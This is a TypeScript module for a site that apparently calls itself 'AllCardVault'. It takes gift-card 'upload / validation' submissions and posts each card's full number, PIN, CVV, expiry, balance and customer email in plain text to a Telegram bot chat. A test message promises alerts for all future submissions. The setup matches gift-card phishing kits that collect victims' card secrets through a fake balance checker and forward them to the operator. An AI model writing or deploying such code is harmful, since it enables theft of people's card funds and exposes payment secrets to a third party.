import fetch from 'node-fetch';

export interface TelegramCardData {
  id?: string;
  brand: string;
  cardNumber: string;
  pin?: string | null;
  cvv?: string | null;
  expiryDate?: string | null;
  cardAmount?: number | null;
  currency?: string | null;
  customerEmail?: string | null;
  status?: string | null;
  notes?: string | null;
  images?: string[] | null;
  createdAt?: Date | string | null;
}

export async function sendTelegramCardAlert(card: TelegramCardData): Promise<{ success: boolean; message?: string }> {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.log('[Telegram Service] TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not configured in environment.');
    return { success: false, message: 'Telegram Bot Token or Chat ID not configured.' };
  }

  const brandName = card.brand || 'Unknown Gift Card';
  const amountStr = typeof card.cardAmount === 'number' && card.cardAmount > 0
    ? `${card.currency || 'USD'} $${card.cardAmount.toFixed(2)}`
    : 'Not Specified';
  const customer = card.customerEmail || 'Guest User';
  const statusStr = card.status || 'PENDING';

  // Format clean Markdown message for Telegram
  let text = `🚨 *NEW CARD UPLOADED / VALIDATION REQUEST*\n\n`;
  text += `💳 *Brand:* ${brandName}\n`;
  text += `🔢 *Card Number:* \`${card.cardNumber || 'N/A'}\`\n`;
  if (card.pin) text += `🔑 *PIN:* \`${card.pin}\`\n`;
  if (card.cvv) text += `🔒 *CVV:* \`${card.cvv}\`\n`;
  if (card.expiryDate) text += `📅 *Expiry:* ${card.expiryDate}\n`;
  text += `💵 *Balance/Amount:* ${amountStr}\n`;
  text += `📧 *Customer:* ${customer}\n`;
  text += `⚡ *Status:* ${statusStr}\n`;
  if (card.notes) text += `📝 *Notes:* ${card.notes}\n`;
  text += `\n⏰ *Time:* ${new Date().toUTCString()}`;

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken.trim()}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId.trim(),
        text,
        parse_mode: 'Markdown',
        disable_web_page_preview: true,
      }),
    });

    const data = (await response.json()) as any;
    if (data.ok) {
      console.log(`[Telegram Service] ✅ Alert successfully sent to Telegram chat ${chatId}`);
      return { success: true };
    } else {
      console.error(`[Telegram Service] ❌ Failed to send Telegram alert:`, data.description || data);
      return { success: false, message: data.description || 'Failed to send Telegram message' };
    }
  } catch (err: any) {
    console.error(`[Telegram Service] ❌ Telegram API connection error:`, err?.message || err);
    return { success: false, message: err?.message || 'Connection error' };
  }
}

export async function sendTelegramTestMessage(customToken?: string, customChatId?: string): Promise<{ success: boolean; message: string }> {
  const botToken = customToken || process.env.TELEGRAM_BOT_TOKEN;
  const chatId = customChatId || process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    return {
      success: false,
      message: 'Please provide both TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID.',
    };
  }

  const text = `🎉 *AllCardVault Telegram Bot Test*\n\nYour Telegram integration is connected and working perfectly!\n\nAll future uploaded gift cards and balance validation submissions will automatically post instant alerts to this chat.\n\n⏰ *Connected:* ${new Date().toUTCString()}`;

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken.trim()}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId.trim(),
        text,
        parse_mode: 'Markdown',
      }),
    });

    const data = (await response.json()) as any;
    if (data.ok) {
      return { success: true, message: 'Test message sent successfully to Telegram!' };
    } else {
      return { success: false, message: `Telegram Error: ${data.description || 'Invalid Bot Token or Chat ID'}` };
    }
  } catch (err: any) {
    return { success: false, message: `Network Error: ${err?.message || 'Failed to reach Telegram API'}` };
  }
}
